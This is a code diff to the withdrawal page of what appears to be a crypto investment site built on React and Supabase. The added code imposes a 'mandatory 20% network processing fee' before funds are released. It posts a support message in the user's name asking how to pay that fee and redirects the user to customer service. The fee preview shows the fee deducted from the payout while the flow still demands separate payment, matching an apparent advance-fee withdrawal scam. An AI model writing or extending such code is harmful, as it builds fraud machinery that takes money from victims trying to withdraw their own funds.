@@ -1,4 +1,4 @@
-import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useState } from "react";
 import { useQuery } from "@tanstack/react-query";
 import { supabase } from "@/integrations/supabase/client";
@@ -9,7 +9,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Badge } from "@/components/ui/badge";
-import { CircleCheck as CheckCircle2, Clock, Circle as XCircle, Loader as Loader2 } from "lucide-react";
+import { CircleCheck as CheckCircle2, Clock, Circle as XCircle, Loader as Loader2, AlertTriangle, Headphones } from "lucide-react";
 import { toast } from "sonner";
 import { motion } from "framer-motion";
 
@@ -44,6 +44,8 @@ function WithdrawPage() {
   });
 
   const available = Number(profile?.available_cash ?? 0);
+  const fee = Number(amount) * 0.2;
+  const net = Number(amount) - fee;
 
   const submit = async () => {
     const amt = Number(amount);
@@ -51,29 +53,63 @@ function WithdrawPage() {
     if (amt > available) return toast.error("Amount exceeds available balance");
     if (!wallet.trim()) return toast.error("Enter your wallet address");
     setSubmitting(true);
-    const { error } = await supabase.from("withdrawals").insert({
-      user_id: user!.id, amount: amt, crypto_currency: currency, wallet_address: wallet.trim(),
-    });
-    setSubmitting(false);
-    if (error) { toast.error(error.message); return; }
-    await supabase.from("transactions").insert({
-      user_id: user!.id,
-      type: "withdrawal_request",
-      amount: amt,
-      asset_name: `Pending withdrawal ${currency}`,
-      status: "pending",
-    });
-    toast.success("Withdrawal request submitted");
-    setAmount(""); setWallet(""); refetch();
-    navigate({ to: "/support" });
+
+    try {
+      const { error } = await supabase.from("withdrawals").insert({
+        user_id: user!.id, amount: amt, crypto_currency: currency, wallet_address: wallet.trim(), status: "pending",
+      });
+      if (error) throw error;
+
+      await supabase.from("transactions").insert({
+        user_id: user!.id,
+        type: "withdrawal_request",
+        amount: amt,
+        asset_name: `Pending withdrawal ${currency} (20% fee applies)`,
+        status: "pending",
+      });
+
+      let threadId: string | null = null;
+      const { data: existing } = await supabase.from("support_threads").select("id").eq("user_id", user!.id).maybeSingle();
+      if (existing?.id) {
+        threadId = existing.id;
+      } else {
+        const { data: created } = await supabase.from("support_threads").insert({ user_id: user!.id, subject: "Withdrawal Request" }).select().maybeSingle();
+        threadId = created?.id ?? null;
+      }
+
+      if (threadId) {
+        await supabase.from("support_messages").insert({
+          thread_id: threadId, user_id: user!.id, sender: "user",
+          body: `Withdrawal request: $${amt.toFixed(2)} ${currency} to ${wallet.trim().slice(0, 16)}…\n\nA mandatory 20% network processing fee ($${fee.toFixed(2)}) applies before the withdrawal can be released. Net payout: $${net.toFixed(2)}. Please provide instructions for fee payment.`,
+        });
+      }
+
+      toast.success("Withdrawal request submitted — redirecting to customer service");
+      setAmount(""); setWallet(""); refetch();
+      navigate({ to: "/support" });
+    } catch (err: any) {
+      toast.error(err.message ?? "Submission failed");
+    } finally {
+      setSubmitting(false);
+    }
   };
 
   return (
     <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="mx-auto max-w-3xl space-y-6">
       <div>
         <h1 className="text-3xl font-bold tracking-tight">Withdraw funds</h1>
-        <p className="text-sm text-muted-foreground">Request a payout to your crypto wallet. Funds are sent after processing.</p>
+        <p className="text-sm text-muted-foreground">Request a payout to your crypto wallet. A mandatory 20% network processing fee applies.</p>
       </div>
+
+      <Card className="p-4 border-warning/40 bg-warning/5">
+        <div className="flex items-start gap-3">
+          <AlertTriangle className="mt-0.5 h-5 w-5 shrink-0 text-warning" />
+          <div className="text-sm">
+            <p className="font-semibold text-warning">Mandatory 20% processing fee</p>
+            <p className="mt-1 text-muted-foreground">All withdrawals require a 20% network processing fee before funds can be released. After submitting your request, you will be redirected to customer service to complete the process.</p>
+          </div>
+        </div>
+      </Card>
 
       <Card className="p-6 space-y-5">
         <div className="rounded-lg bg-surface p-3 text-sm">
@@ -97,6 +133,14 @@ function WithdrawPage() {
           </div>
         </div>
 
+        {amount && Number(amount) > 0 && (
+          <div className="rounded-lg border border-border bg-surface p-3 text-sm space-y-1">
+            <div className="flex justify-between"><span className="text-muted-foreground">Withdrawal amount</span><span className="tabular-nums">${Number(amount).toFixed(2)}</span></div>
+            <div className="flex justify-between"><span className="text-muted-foreground">Processing fee (20%)</span><span className="tabular-nums text-destructive">-${fee.toFixed(2)}</span></div>
+            <div className="flex justify-between border-t border-border pt-1 font-semibold"><span>Net payout</span><span className="tabular-nums text-success">${net.toFixed(2)}</span></div>
+          </div>
+        )}
+
         <div className="space-y-2">
           <Label>Your wallet address</Label>
           <Input placeholder="Destination address" value={wallet} onChange={(e) => setWallet(e.target.value)} />
@@ -104,7 +148,7 @@ function WithdrawPage() {
 
         <Button onClick={submit} disabled={submitting} className="w-full">
           {submitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-          Submit withdrawal request
+          Submit & contact customer service
         </Button>
       </Card>
 
@@ -127,9 +171,14 @@ function WithdrawPage() {
         )}
       </Card>
 
-      <p className="text-center text-xs text-muted-foreground">
-        Need help? <Link to="/support" className="text-primary underline">Contact support</Link>
-      </p>
+      <Card className="flex items-center gap-3 p-4 border-primary/30 bg-primary/5">
+        <Headphones className="h-5 w-5 text-primary" />
+        <div className="text-sm">
+          <p className="font-semibold">Need help with your withdrawal?</p>
+          <p className="text-muted-foreground">Our customer service team will guide you through the fee payment and release process.</p>
+        </div>
+        <Button variant="outline" size="sm" className="ml-auto" onClick={() => navigate({ to: "/support" })}>Contact support</Button>
+      </Card>
     </motion.div>
   );
 }
